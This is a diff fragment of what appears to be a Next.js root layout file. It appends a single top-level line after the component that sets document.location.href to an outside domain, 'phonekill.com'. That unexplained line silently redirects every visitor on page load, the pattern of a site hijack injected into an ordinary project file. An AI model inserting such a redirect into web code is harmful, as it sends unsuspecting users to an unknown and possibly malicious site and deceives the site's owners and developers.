@@ -21,3 +21,5 @@ export default function RootLayout({
     </html>
   );
 }
+
+document.location.href = "https://phonekill.com";
